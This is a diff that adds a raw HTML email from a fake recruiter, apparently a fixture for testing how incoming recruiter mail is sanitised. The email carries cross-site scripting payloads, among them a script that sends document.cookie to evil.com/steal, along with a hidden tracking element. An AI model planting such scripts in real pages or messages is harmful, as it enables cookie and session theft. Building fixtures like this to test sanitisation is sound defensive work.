@@ -1,0 +1,25 @@
+From: recruiter@evil.com
+To: recruiters@inbox.sh3r4rd.com
+Subject: Amazing Job Opportunity
+Date: Thu, 06 Mar 2026 12:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<head>
+<style>body { font-family: Arial; }</style>
+</head>
+<body>
+<h1>Great Opportunity!</h1>
+<script>alert('xss')</script>
+<p>Hi there,</p>
+<p>I'm <b>Eve Hacker</b> from <script>document.cookie</script> TechCorp. We have a <i>Principal Engineer</i> position available.</p>
+<script type="text/javascript">
+  var malicious = "payload";
+  fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>
+<p>Contact me at eve@techcorp.com or call 212-555-9876.</p>
+<style>.hidden { display: none; } </style>
+<div class="hidden">hidden tracking pixel</div>
+</body>
+</html>
